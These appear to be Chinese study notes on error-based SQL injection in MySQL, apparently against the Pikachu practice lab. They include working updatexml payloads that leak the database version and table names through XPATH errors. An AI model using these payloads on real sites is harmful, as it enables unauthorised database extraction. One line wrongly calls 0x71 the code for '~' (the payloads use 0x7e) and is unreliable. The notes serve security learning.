基于函数报错的信息获取
常用报错函数
updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数
extractvalue() 是mysql对xml文档数据进行查询的xpath函数
floor() 是mysql用来取整的函数

为什么？
因为后台没有catch数据库的报错信息 在发生语法错误的时候输出在前端


updatexml(xml_document, xpath, new_value)

eg
xx' and updatexml(1, version(), 0)#

继续改造payload
0x71是~的ascii
xx' and updatexml(1, concat(0x7e, version()),0)#

返回结果
XPATH syntax error: '~5.7.26'


xx' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='pikachu')),0)#

xx' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#